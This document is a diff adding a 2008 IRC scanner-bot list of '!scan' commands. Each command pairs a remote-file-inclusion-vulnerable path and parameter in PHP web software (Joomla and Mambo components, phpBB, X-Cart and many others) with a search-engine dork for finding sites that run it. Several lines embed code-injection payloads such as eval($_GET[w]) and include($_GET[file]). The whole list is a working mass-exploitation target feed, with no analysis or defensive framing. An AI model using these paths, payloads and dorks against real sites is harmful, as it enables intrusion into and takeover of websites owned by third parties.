@@ -1,0 +1,4524 @@
+Last Update 17-08-2008 by ryey @irc.monjali.org @Mildnet & @DalNet
+
+
+!scan ?custompluginfile[]= index.php?categoryid=5
+!scan ?custompluginfile[]= index.php?categoryid=10
+!scan ?custompluginfile[]= index.php?categoryid=15
+!scan index.php?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path= %22%2Fincludes%2Fjoomla.php%22
+!scan /parse/parser.php?WN_BASEDIR= WEB//NEWS Personal Newsmanagement - © 2002-2004 by Christian Scheb - Stylemotion.de
+!scan /?installed_config_file= "PhpJobScheduler"
+!scan /pjsfiles/modify.php?installed_config_file= "PhpJobScheduler"
+!scan errors.php?error= "/com_rwcards" "/com_rwcards"
+!scan //vwar/backup/errors.php?error= "errors.php"
+!scan /lib/adodb_lite/adodb-perf-module.inc.php?last_module=zZz_ADOConnection{}eval($_GET[w]);class%20zZz_ADOConnection{}//&w=include($_GET[a]);&a= "powered by CMS Made Simple version"
+!scan /s_loadenv.inc.php?DOCUMENT_ROOT= "netcat require"
+!scan /components/com_rwcards/rwcards.advancedate.php?mosConfig_absolute_path= "php?option=com_rwcards" "php?option=com_rwcards"
+!scan inc/functions.inc.php?config[ppa_root_path]= "Index - Albums"
+!scan phphtml.php?htmlclass_path= "phphtml.php"
+!scan lib/adodb_lite/adodb-perf-module.inc.php?last_module=zZz_ADOConnection{}eval($_GET[w]);class%20zZz_ADOConnection{}//&w=include($_GET[a]);&a= "/adodb_lite" "/adodb_lite"
+!scan /?path%5Bdocroot%5D= "/newspublish" "/newspublish"
+!scan /?sIncPath= %22Links%22+%22%7C%22+%22News%22+%22%7C%22+%22Contact+Us%22+%22%7C%22+%22About+us%22+%22%7C%22+%22Privacy%22+%22%7C%22+%22Terms%22+%22%7C%22+%22FAQ%22+%22%7C%22+%22Add+feedback%22+%22%7C%22+%22Invite+a+friend%22+%22%7C%22+%22Bookmark%22
+!scan errors.php?error= "netcat_files"
+!scan /index.php?DOCUMENT_ROOT= "netcat_files"
+!scan errors.php?error= %22Home%22+%22%7C%22+%22Sell+an+item%22+%22%7C%22+%22Register+now%22+%22%7C%22+%22Login%22+%22%7C%22+%22Help%22+%22%7C%22+%22About+Us%22+%22%7C%22+%22Terms+%26+Conditions%22
+!scan /?prefix= %22Home%22+%22%7C%22+%22Sell+an+item%22+%22%7C%22+%22Register+now%22+%22%7C%22+%22Login%22+%22%7C%22+%22Help%22+%22%7C%22+%22About+Us%22+%22%7C%22+%22Terms+%26+Conditions%22
+!scan ?sIncPath= "powered by boonex"
+!scan plugins/safehtml/HTMLSax3.php?dir[plugins]= "powered by boonex"
+!scan errors.php?error= "powered by boonex"
+!scan include/plugins/jrBrowser/purchase.php?jamroom[jm_dir]= "powered by boonex"
+!scan errors.php?error= "/ray.3.5" "/ray.3.5"
+!scan ?sourcedir= index.php?sourcedir=
+!scan errors.php?error= "/com_ponygallery"
+!scan /?page= /?pagedb=?
+!scan hw3.php?daysonly=0).include($_GET[file]).(0&file= "Current Conditions" "Sun & Moon Information"
+!scan /?page= "ArticleBeach"
+!scan /tools/send_reminders.php?noSet=0&includedir= includes/php-dbi.php
+!scan /Orca-2.0.beta2/layout/default/params.php?gConf[dir][layouts]= "Powered by Orca Interactive Forum Script"
+!scan errors.php?error= "Powered by Orca Interactive Forum Script"
+!scan /program/modules/mods_full/shopping_cart/includes/login.php?_SESSION%5Bdocroot_path%5D= "/sohoadmin/"
+!scan /?include_path= "guestbook"
+!scan /?include_path= "action"+"poll_ident"
+!scan /admin/include/lib.module.php?mod_root= "/cmsworks"
+!scan errors.php?error= "/com_extcalendar"
+!scan /admin/templates/template_thumbnail.php?thumb_template= "Powered by HomePH Design"
+!scan /includes/header.php?c_temp_path= "/header.php"
+!scan /include/admin.lib.inc.php?site_path= "include/lib.inc.php"
+!scan src/browser/resource/categories/resource_categories_view.php?CLASSES_ROOT= "/resource/categories"
+!scan errors.php?error= "phpkit" "phpkit"
+!scan errors.php?error= "/contenido/includes"
+!scan popup.php?path= "phpkit" "phpkit"
+!scan /contenido/includes/include.newsletter_jobs_subnav.php?cfg[path][contenido]= "/contenido/includes"
+!scan include/plugins/jrBrowser/purchase.php?jamroom[jm_dir]= "/plugins/jrBrowser/"
+!scan /weather/hw3.php//hw3.php?daysonly=0).include($_GET[file]).(0&file= /weather/hw3.php/
+!scan /administrator/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path= "com_pollxt"
+!scan /ktmllite/includes/ktedit/toolbar.php?dirDepth= "ktmllite" "ktmllite"
+!scan errors.php?error= "Subdreamer"
+!scan //?custompluginfile%5B%5D= Created by Subdreamer CMS
+!scan lostpasswd.php?env[include_prefix]= bookmark4u
+!scan /poll/png.php?include_path= "action"+"poll_ident"
+!scan /inc/formmail.inc.php?script_root= "Powered By Form Mail Script"
+!scan /phpAdsNew/view.inc.php?phpAds_path= "Copyright 2000-2002, PHPAUCTION.ORG"
+!scan /authentication/errors.php?error= "phpbb3"
+!scan /authentication/phpbb3/phpbb3.functions.php?pConfig_auth[phpbb_path]= /phpbb3/
+!scan errors.php?error= "phpRaider"
+!scan /poll/booth.php?include_path= "action"+"poll_ident" 
+!scan /orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "index.php%3Fpr%3D+site%3Anet"
+!scan /orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "index.php%3Fpr%3D+site%3Aorg"
+!scan /orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "index.php%3Fpr%3D+site%3Aus"
+!scan /orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "index.php%3Fpr%3D+site%3Aru"
+!scan amember/plugins/payment/linkpoint/linkpoint.inc.php?config[root_dir]= 12%22If+you+are+a+registered+member%2C+please+login.+If+you+are+not+registered+yet%2C+please+signup.%22
+!scan /admin.php?include_path= "Total Records:" "HTML code is" "guestbook"
+!scan /guestbook1//admin.php?include_path= "guestbook1"
+!scan poll/booth.php?include_path= "Advanced Poll"
+!scan index.php?url= index.php?url=
+!scan /galeria.php?start=0&kategoria= /galeria.php?start=0&kategoria=
+!scan home.php?index= "home.php?index="
+!scan head.php?adresa= head.php?
+!scan /poll/png.php?include_path= extcalendar
+!scan /includes/db_adodb.php?baseDir= "dotProject logo"
+!scan index.php?option=com_xfaq&task=answer&Itemid=S@BUN&catid=97&aid= allinurl: aid "com_xfaq"
+!scan /jscript.php?my_ms[root]= intitle:"myspeach" "chat_exemple.php"
+!scan includes/stats.inc.php?prefix= browse.php%3Fid%3D site:com
+!scan components/com_sitemap/sitemap.php?mosConfig_admin_path= /component/option,com_sitemap/
+!scan /component/option,com_sitemap/Itemid,141/components/com_sitemap/sitemap.php?mosConfig_admin_= "Powered by Mambo"
+!scan includes/useragent.inc.php?prefix= "/browse.php?id="
+!scan docs/front-end-demo/cart2.php?workdir= %22hosting.php?pt=r%22 site:au
+!scan /include/lib.inc.php?site_path= "lib.inc.php"
+!scan /joomla_Path/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]= "Joomla Component mosDirectory"
+!scan /index.php?option=com_frontpage&Itemid=&mosConfig_absolute_path= "/includes/joomla.php"
+!scan /guestbook/errors.php?error= "Guestbook - Administration"
+!scan /index.php?page= index.php%"Submit%Articles"%"Member%Login"%"Top%Authors"
+!scan errors.php?error= "powered by TalkBack"
+!scan /components/errors.php?error= "com_simpleboard"
+!scan /modules/errors.php?error= "/includes/mambo.php"
+!scan /errors.php?error= "Joomla Visites"
+!scan /modules/Forums/admin/errors.php?error= com_gallery
+!scan /include/bbs.lib.inc.php?site_path= "/rgboard/"
+!scan /ch_readalso.php?read_xml_include= "Copyrights © 2005 Belgische Federale Overheidsdiensten"
+!scan /txt-db-api/txt-db-api.php?API_HOME_DIR= "powered by Crafty Syntax Live Help 2.7"
+!scan /dotproject//includes/db_connect.php?baseDir= "dotproject"
+!scan modules/dungeon/tick/allincludefortick.php?PATH_TO_CODE= modules/dungeon
+!scan /index.php?option=com_letterman&task=view&Itemid=&mosConfig_absolute_path= "com_letterman"
+!scan /index.php?config=1&base_datapath= wmview.php
+!scan errors.php?error= "index"+"of/"+"errors.php"
+!scan /accounts/inc/include.php?language=0&lang_settings[0][1]= "powered by Icewarp"
+!scan /include/write.php?dir= "/write.php?dir="
+!scan /errors.php?error= /errors.php?error=
+!scan /components/com_flyspray/startdown.php?file= "/com_flyspray"
+!scan /modules/xfsection/modify.php?dir_module= "xfsection" "xfsection"
+!scan /common/db.php?commonpath= "samPHPweb" "samPHPweb"
+!scan errors.php?error= "samPHPweb" "samPHPweb"
+!scan config.inc.php?path_escape= "XZero Community Classifieds" "XZero Community Classifieds"
+!scan inc/TabStrip.php?function= "includeTab" "includeTab"
+!scan /config.inc.php?path_escape= "Classifieds for our community"
+!scan errors.php?error= "Classifieds for our community"
+!scan /admin/spaw/spaw_control.class.php?spaw_root= "xt_conteudo" "xt_conteudo"
+!scan errors.php?error= "/appserv"
+!scan /index.php?name=PNphpBB2&file=viewtopic&t=8/viewtopic.php?p=15&sid=be4c914eb746ac7c96beea717fdfc692/&highlight=%27.include($_GET[a]),exit.%27&a= "index.php?name=PNphpBB2"
+!scan /index.php?name=PNphpBB2&file=viewtopic&t=8/viewtopic.php?p=15&sid=be4c914eb746ac7c96beea717fdfc692/&highlight=%2527.include($_GET[a]),exit.%2527&a= "index.php?name=PNphpBB2"
+!scan /index.php?name=PNphpBB2&file=posting&mode=quote/index.php?name=PNphpBB2&file=viewtopic&p=34004/viewtopic.php?p=15&sid=be4c914eb746ac7c96beea717fdfc692/&highlight= "index.php?name=PNphpBB2"
+!scan /index.php?_REQUEST=&_REQUEST[option]=option,com_comprofiler&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path= "com_comprofiler" "com_comprofiler"
+!scan /includes/mailaccess/pop3.php?CONFIG[pear_dir]= "mailaccess"
+!scan /includes/functions_portal.php?phpbb_root_path= "phpbb" "phpbb"
+!scan /include/monitoring/engine/MakeXML4statusCounter.php?fileOreonConf= "MakeXML4statusCounter.php" "MakeXML4statusCounter.php"
+!scan /inc/cmses/aedatingCMS.php?dir%5Binc%5D= "cmses" "cmses"
+!scan /import_export/pages/index.inc.php?REX[INCLUDE_PATH]= "Redaxo 2.7.4" "Redaxo 2.7.4"
+!scan /faqsupport/samplefaqsupport.php?path[docroot]= "OneAdmin" "OneAdmin"
+!scan /ecommerce/payment/cybersource.php?path[docroot]= "ecommerce"
+!scan /doceboCms/class/class.dashboard_cms.php?where_framework= "doceboCms" "doceboCms"
+!scan /config/dbutil.bck.php?confdir= "/config/dbutil.bck.php"
+!scan /config.inc.php?config%5broot_dir%5d= "CLASSIFIEDS"
+!scan /claroline/tracking/userLog.php?rootSys= /claroline/ /claroline/
+!scan /claroline/phpbb/page_tail.php?includePath= /claroline/ /claroline/
+!scan /citywriter/head.php?path= /citywriter/
+!scan /bookmark4u/lostpasswd.php?env%5Binclude_prefix%5D= /bookmark4u/ /bookmark4u/
+!scan /atom.php5?page= "atom.php5?page="
+!scan /ashnews.php?pathtoashnews= "pathtoashnews"
+!scan /newspublish/include.php?path%5Bdocroot%5D= "newspublish"
+!scan /agendax/addevent.inc.php?agendax_path= /agendax/
+!scan /PHP_CON/Exchange/include.php?webappcfg[APPPATH]= "PHP-CON v1.3" "PHP-CON v1.3"
+!scan /Neos_Chronos/header.php?base_folder= /Neos_Chronos/ /Neos_Chronos/
+!scan /administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path= "com_chronocontact" "com_chronocontact"
+!scan /mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]= /mwchat/ /mwchat/
+!scan /%5Cecommerce%5Cpapyment%5Ccybersource.php?path[docroot]= "Cecommerce" "Cecommerce"
+!scan /excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path= /excelwriter/ /excelwriter/
+!scan /inc/download_center_lite.inc.php?script_root= "Download Center Lite"
+!scan /encapscms_PATH/core/core.php?root= "encapscms 0.3.6" "encapscms 0.3.6"
+!scan /components/com_thopper/inc/contact_type.php?mosConfig_absolute_path= "com_thopper"
+!scan /components/com_pccookbook/pccookbook.php?mosConfig_absolute_path= "com_pccookbook"
+!scan /admin/business_inc/saveserver.php?thisdir= "saveserver.php"
+!scan /admin/classes/TplLoad.php?full_path_to_public_program= "TplLoad.php"
+!scan /PhpLinkExchange/bits_listings.php?svr_rootP= /PhpLinkExchange/
+!scan /PNphpBB2/includes/functions_admin.php?phpbb_root_path= /PNphpBB2/
+!scan /index.php?option=com_mambowiki&Itemid=&mosConfig_absolute_path= "com_mambowiki"
+!scan /index.php?option=com_mambots&Itemid=&mosConfig_absolute_path= "com_mambots"
+!scan /index.php?option=com_mambatstaff&Itemid=&mosConfig_absolute_path= "com_mambatstaff"
+!scan /index.php?option=com_magazine&Itemid=&mosConfig_absolute_path= "com_magazine"
+!scan /index.php?option=com_lurm_constructor&Itemid=&mosConfig_absolute_path= "com_lurm_constructor"
+!scan /index.php?option=com_loudmounth&Itemid=&mosConfig_absolute_path= "com_loudmounth"
+!scan /index.php?option=com_log&Itemid=&mosConfig_absolute_path= "com_log"
+!scan /index.php?option=com_lmo&Itemid=&mosConfig_absolute_path= "com_lmo"
+!scan /index.php?option=com_linkdirectory&Itemid=&mosConfig_absolute_path= "com_linkdirectory"
+!scan /index.php?option=com_kochsuite&Itemid=&mosConfig_absolute_path= "com_kochsuite"
+!scan /index.php?option=com_jreactions&Itemid=&mosConfig_absolute_path= "com_jreactions"
+!scan /index.php?option=com_flyspray&Itemid=&mosConfig_absolute_path= "com_loudmounth"
+!scan /index.php?option=com_dbquery&Itemid=&mosConfig_absolute_path= "com_dbquery" 
+!scan /index.php?option=com_datsogallery&&Itemid=&mosConfig_absolute_path= "com_datsogallery"
+!scan /index.php?option=com_bayesiannaivefilter&Itemid=&mosConfig_absolute_path= "com_bayesiannaivefilter"
+!scan /modules/xoopsgallery/init_basic.php?GALLERY_BASEDIR= /xoopsgallery/ /xoopsgallery/
+!scan /skin/zero_vote/error.php?dir= "zeroboard"
+!scan /mambots/content/multithumb/multithumb.php?mosConfig_absolute_path= "/mambots/content/" "/mambots/content/"
+!scan /drupal/?_menu[callbacks][1][callback]= "drupal"
+!scan /config.inc.php?path_escape= "Powered by SNETWORKS PHP CLASSIFIEDS"
+!scan /?mosConfig_absolute_path= "Joomla" "Joomla"
+!scan /index.php?autoLoadConfig[999][0][autoType]=include&autoLoadConfig[999][0][loadFile]= "index.php?autoLoadConfig"
+!scan /skin/zero_vote/ask_password.php?dir= "zeroboard" net "zeroboard" uk
+!scan classes/core/language.php?rootdir= "LimeSurvey"
+!scan classes/core/language.php?rootdir= "You have not provided a survey identification number"
+!scan PHPDJ_v05/dj/djpage.php?page= allintext:"PHPDJ was created by www.php-mania.co.uk"
+!scan /inc/cmses/aedating4CMS.php?dir[inc]= inurl:flashchat
+!scan /photoalb/lib/static/header.php?set_menu= allintitle:iPhotoAlbum
+!scan index.php?redir= inurl:"index.php?redir="
+!scan /phpopenchat/contrib/yabbse/poc.php?sourcedir= intitle:PHPOpenChat ext:php
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:"us/index.php?option=com_remository
+!scan inc/functions.inc.php?config[ppa_root_path]= "Index - Albums" inurl:index.php
+!scan inc/cmses/aedatingCMS.php?dir[inc]= allinurl:"cmses"
+!scan phphtml.php?htmlclass_path= phphtml.php
+!scan /phpsecurityadmin/include/logout.php?PSA_PATH= "PHPSecurityAdmin"
+!scan components/com_colorlab/admin.color.php?mosConfig_live_site= com_colorlab
+!scan /poll/comments.php?id={${include($ddd)}}{${exit()}}&ddd= "Advanced Poll"
+!scan active/components/xmlrpc/client.php?c[components]= "Pindorama"
+!scan apps/apps.php?app= WebDesktop
+!scan nuseo/admin/nuseo_admin_d.php?nuseo_dir= "NuSEO PHP"
+!scan drupal/?_menu[callbacks][1][callback]= Drupal
+!scan tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title= TikiWiki
+!scan administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path= com_jcs
+!scan administrator/components/com_jcs/view/register.php?mosConfig_absolute_path= com_jcs
+!scan components/com_mp3_allopass/allopass.php?mosConfig_live_site= com_mp3_allopass
+!scan scan administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path= "com_jcs"
+!scan /modules/coppermine/themes/default/theme.php?THEME_DIR= ""Powered by Coppermine"
+!scan /default.php?page=home inurl:"/default.php?page=home"
+!scan /default.php?page= inurl:"/default.php?page=home"
+!scan /PhpLinkExchange/bits_listings.php?svr_rootPhpStart= inurl:PhpLinkExchange
+!scan /openi-admin/base/fileloader.php?config[openi_dir]= Powered by OPENi-CMS
+!scan /components/com_mp3_allopass/allopass.php?mosConfig_live_site=
+!scan /components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=
+!scan index.php?root_path= "powered by Open Bulletin Board"
+!scan config.php?fpath= "Powered By PUMA"
+!scan /index.php?classified_path= "Vivvo Article Manager"
+!scan index.php?base= powered by MyABraCaDaWeb
+!scan pop.php?base= powered by MyABraCaDaWeb
+!scan extras/ext_cats.php?dir_path= photokorn 1.52
+!scan content/article.php?ide= inurl:WM-News
+!scan content/modify_go.php?pwfile= inurl:WM-News
+!scan protection.php?action=logout&siteurl= allinurl%3Amembers.php%3Fid%3Dall+site%3Anet
+!scan /inc/header.php/step_one.php?server_inc= step_one.php?sid
+!scan /language/lang_english/lang_main_album.php?phpbb_root_path= "Powered by phpBB2" site:fr
+!scan language/lang_english/lang_main_album.php?phpbb_admin_path= phpBB
+!scan phpwcms_template/inc_script/frontend_render/navigation/config_PHPLM.php?HTML_MENU_DirPath= Copyright © 2007 by Horst-D. Kröller · CMS: php WCMS
+!scan phpwcms_template/inc_script/frontend_render/navigation/config_HTML_MENU.php?HTML_MENU_DirPath= Copyright © 2007 by Horst-D. Kröller · CMS: php WCMS
+!scan index.php?themesdir= "Segue v."+"Middlebury College"
+!scan lib/base.php?BaseCfg[BaseDir]= actSite
+!scan index.php?themesdir= "Segue v."+"Middlebury College"
+!scan /includes/openid/Auth/OpenID/BBStore.php?openid_root_path= "phpBB"
+!scan contrib/mx_glance_sdesc.php?mx_root_path= "mx_glance"
+!scan contrib/mx_glance_sdesc.php?mx_root_path= "mxBB"
+!scan amember/plugins/payment/linkpoint/linkpoint.inc.php?config[root_dir]= "amember"
+!scan news/newstopic_inc.php?indir= "Public Media Manager"
+!scan phfito/phfito-post?SRC_PATH= "phpFidoNode"
+!scan /protection.php?action=logout&siteurl= "/members.php?id=all"
+!scan /appserv/main.php?appserv_root= "The AppServ Open Project"
+!scan includes/archive/archive_topic.php?phpbb_root_path= IntegraMOD
+!scan admin/include/header.php?repertoire= "chupix cms"
+!scan forum/forum.php?view= "lustig.cms"
+!scan access/login.php?path_to_root= "FrontAccounting"
+!scan includes/lang/language.php?path_to_root= "FrontAccounting"
+!scan dfd_cart/app.lib/product.control/core.php/product.control.config.php?set_depth= "DFD Cart"
+!scan dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth= "DFD Cart"
+!scan dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?set_depth= "DFD Cart" 
+!scan show.php?file= "Helplink"
+!scan data/compatible.php?module_name= "Nuke Mobile Entartainment"
+!scan config.inc.php?_path= "WordSmith"
+!scan modules/search/search.php?language_home=&rootdp=zZz&gsLanguage= "iziContents"
+!scan modules/poll/inlinepoll.php?language_home=&rootdp=zZz&gsLanguage= "iziContents"
+!scan modules/poll/showpoll.php?language_home=&rootdp=zZz&gsLanguage= "iziContents"
+!scan modules/links/showlinks.php?language_home=&rootdp=zZz&gsLanguage= "iziContents"
+!scan modules/links/submit_links.php?rootdp=zZz&gsLanguage= "iziContents"
+!scan modifyform.html?code= modifyform
+!scan Encoder.php?base_dir= phpsyncml
+!scan Decoder.php?base_dir= phpsyncml
+!scan administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site= "com_joom12pic"
+!scan phpffl/phpffl_webfiles/program_files/livedraft/admin.php?PHPFFL_FILE_ROOT= "phpFFL"
+!scan phpffl/phpffl_webfiles/program_files/livedraft/livedraft.php?PHPFFL_FILE_ROOT= "phpFFL"
+!scan afb-3-beta-2007-08-28/_includes/settings.inc.php?approot= "Ajax File Browser"
+!scan administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site= inurl:"com_joomlaradiov5"
+!scan config.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+!scan prepare.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+!scan smarty.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+!scan customer/product.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+!scan provider/auth.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+!scan admin/auth.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+!scan NuclearBB/tasks/send_queued_emails.php?root_path= NuclearBB
+!scan protection.php?action=logout&siteurl= "Site Layout & Graphics"
+!scan protection.php?action=logout&siteurl= statcounter
+!scan protection.php?action=logout&siteurl= "PHPFanBase"
+!scan manager/admin/index.php?MGR= "phpRealty"
+!scan manager/admin/p_ins.php?MGR= "phpRealty"
+!scan manager/admin/u_ins.php?MGR= "phpRealty"
+!scan source/mod/rss/viewitem.php?Codebase= ED Engine
+!scan source/mod/rss/view.php?Codebase= ED Engine
+!scan source/mod/rss/post.php?Codebase= ED Engine
+!scan source/mod/rss/channeledit.php?Codebase= WebEd
+!scan joomla/index.php?option=com_restaurante&task= "/index.php?option=com_restaurante"
+!scan modules/addons/plugin.php?doc_root= "txx cms"
+!scan modules/addons/plugin.php?doc_root= inurl:addons
+!scan modules/Discipline/CategoryBreakdownTime.php?FocusPath= inurl:Discipline
+!scan modules/Discipline/CategoryBreakdownTime.php?staticpath= inurl:Discipline
+!scan modules/Discipline/StudentFieldBreakdown.php?staticpath= inurl:Discipline
+!scan lib/functions.php?DOC_ROOT= "Online Fantasy Football League"
+!scan lib/header.php?DOC_ROOT= "Online Fantasy Football League"
+!scan menu.php?functions_file=  phpMytourney
+!scan environment.php?DIR_PREFIX= AnyInventory
+!scan dbmodules/DB_adodb.class.php?PHPOF_INCLUDE_PATH= Phpof
+!scan stphpapplication.php?STPHPLIB_DIR= SpeedTech PHP Library
+!scan senetman/html/index.php?page= eNetman
+!scan es_desp.php?files_dir= Weblogicnet
+!scan es_custom_menu.php?files_dir= Weblogicnet
+!scan es_offer.php?files_dir= Weblogicnet
+!scan stphpbtnimage.php?STPHPLIB_DIR= SpeedTech PHP Library
+!scan stphpform.php?STPHPLIB_DIR= SpeedTech PHP Library
+!scan stphpapplication.php?STPHPLIB_DIR= "stph"
+!scan stphpbtnimage.php?STPHPLIB_DIR= "stph"
+!scan stphpform.php?STPHPLIB_DIR= "stph"
+!scan senetman/html/index.php?page= "senetman"
+!scan /intern/admin/other/backup.php?admin=1&rootdir= "phpBG"
+!scan /intern/admin/?rootdir= "phpBG"
+!scan /intern/clan/member_add.php?rootdir= "phpBG"
+!scan /intern/config/key_2.php?rootdir= "phpBG"
+!scan /intern/config/forum.php?rootdir= "phpBG"
+!scan xGB.php?act=admin&do= allinurl:"xGb.php"
+!scan modules/vwar/convert/mvcw_conver.php?step=1&vwar_root= "mvcw_conver.php"
+!scan convert/mvcw.php?vwar_root= "convert/mvcw.php"
+!scan convert/mvcw.php?step=1&vwar_root= "convert/mvcw.php"
+!scan public_includes/pub_blocks/activecontent.php?vsDragonRootPath= inurl:activecontent.php
+!scan public_includes/pub_blocks/activecontent.php?vsDragonRootPath= "Php Blue Dragon"
+!scan ncaster/admin/addons/archive/archive.php?adminfolder= inurl:ncaster
+!scan ncaster/admin/addons/archive/archive.php?adminfolder= Ncaster 1.7.2
+!scan /chat/inc/cmses/aedating4CMS.php?dir[inc]= inurl:flashchat site:.ru
+!scan database.php?mosConfig_absolute_path= "powered by mambo"
+!scan config.php?path_to_root= inurl:"path_to_root"
+!scan order/login.php?svr_rootscript= "order?page=plan_show"
+!scan admin/inc/change_action.php?format_menue= "PHPNews Version 0.93"
+!scan order/login.php?svr_rootscript= "order?page=plan_show"
+!scan /include.php?path[docroot]= inurl:"newspublish"
+!scan newsletter/newsletter.php?waroot= inurl:newsletter.php?
+!scan mediagallery/public_html/maint/ftpmedia.php?_MG_CONF[path_html]= inurl:mediagallery/
+!scan beacon/language/1/splash.lang.php?languagePath= inurl:/beacon/
+!scan common/func.php?CommonAbsDir= inurl: func.php?
+!scan /surveys/survey.inc.php?path= inurl:surveys
+!scan index.php?body= inurl:"index.php?body="
+!scan /classes/adodbt/sql.php?classes_dir= allinurl:adobt site:pl
+!scan enc/content.php?Home_Path= "powered by doodle cart"
+!scan /classified_right.php?language_dir= inurl:classified.php phpbazar
+!scan /sources/functions.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/template.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /embed/day.php?path= intitle:"Login to Calendar"
+!scan /includes/dbal.php?eqdkp_root_path= "powered by EQdkp"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Powered By Aardvark Topsites PHP 4.2.2"
+!scan /includes/kb_constants.php?module_root_path= "Powered by Knowledge Base"
+!scan /mcf.php?content= allinurl:"mcf.php" site:.de
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= allinurl:"com_facileforms" site:.org
+!scan skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan /zipndownload.php?PP_PATH= "Powered by: PhotoPost PHP 4.6"
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= inurl:"com_serverstat"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= inurl:"index.php?option="com_zoom"
+!scan /main.php?sayfa= inurl:"main.php?sayfa="
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= allinurl:com_extended_registration
+!scan /addpost_newpoll.php?addpoll=preview&thispath= allinurl:"/ubbthreads/"
+!scan /header.php?abspath= "MobilePublisherPHP"
+!scan components/com_performs/performs.php?mosConfig_absolute_path= inurl:"com_performs"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:index.php?option=com_remository
+!scan impex/ImpExData.php?systempath= intext:powered by vbulletin 
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:vwar site:.com
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "powered by phpCOIN"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:.com/index.php?option=com_remository
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan /skin/zero_vote/error.php?dir= skin/zero_vote/error.php
+!scan /modules/TotalCalendar/about.php?inc_dir= allinurl:/TotalCalendar
+!scan /login.php?dir= allinurl:login.php?dir=
+!scan /tags.php?BBCodeFile= intitle:"Tagger LE" inurl:tags.php
+!scan index.php?pageurl= inurl:"index.php?pageurl=*.php"
+!scan /templates/headline_temp.php?nst_inc= "fusion news management system"
+!scan index.php?var= inurl:"index.php?var=*.php"
+!scan index.php?pagina= inurl:"index.php?pagina=*.php"
+!scan index.php?go= inurl:"index.php?go="
+!scan index.php?site= inurl:"index.php?site="
+!scan phpwcms/include/inc_ext/spaw/dialogs/table.php?spaw_root= inurl:"phpwcms/index.php?id="
+!scan administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= inurl:".com.*/index.php?option=com_comprofiler"
+!scan index.php?pagina= inurl:"index.php?pagina=*.php"
+!scan index.php?id= inurl:"index.php?id=*.php"
+!scan index1.php?= inurl:"index1.php?=*.php?
+!scan index.php?site= inurl:"index.php?site=*.php"
+!scan main.php?id= inurl:"main.php?id=*.php"
+!scan content.php?page= inurl:"content.php?page=*.php"
+!scan admin.php?page= inurl:"admin.php?page=*.php"
+!scan lib/gore.php?libpath= inurl:"/SQuery/"
+!scan SQuery/lib/gore.php?libpath= inurl:"/SQuery/"
+!scan index2.php?p= inurl:"index2.php?p=*.php"
+!scan index1.php?go=  inurl:"index1.php?go=*.php"
+!scan news_detail.php?file= inurl:"news_detail.php?file=*.php"
+!scan old_reports.php?file= inurl:"old_reports.php?file=*.php"
+!scan index.php?x= inurl:"index.php?x=*.php"
+!scan index.php?nic= inurl:"index.php?nic=*.php"
+!scan homepage.php?sel= inurl:"homepage.php?sel=*.php"
+!scan index.php?sel= inurl:"index.php?sel=*.php"
+!scan main.php?x= inurl:"main.php?x=*.php"
+!scan components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path= "inurl:com_artlinks" 
+!scan index2.php?x= inurl:index2.php?x=*.php"
+!scan main.php?pagina= inurl:"main.php?pagina=*.php"
+!scan test.php?page= allinurl:test.php?page=
+!scan components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "inurl:com_phpshop"
+!scan akocomments.php?mosConfig_absolute_path= inurl:akocomments.php
+!scan index.php?page= inurl:"edu/index.php?page=*.php"
+!scan *.php?page= inurl:*.php?page=*.php"
+!scan index.php?oldal= inurl:"index.php?oldal=*.php"
+!scan index.php?lang=gr&file inurl:"index.php?lang=gr&file=*.php"
+!scan index.php?pag= inurl:"index.php?pag=*.php"
+!scan index.php?incl= inurl:"index.php?incl="
+!scan avatar.php?page= inurl:"avatar.php?page="
+!scan index.php?_REQUEST=&_REQUEST%5boption%5d=com_content&_REQUEST%5bItemid%5d=1&GLOBALS=&mosConfig_absolute_path= "Mambo is A Free
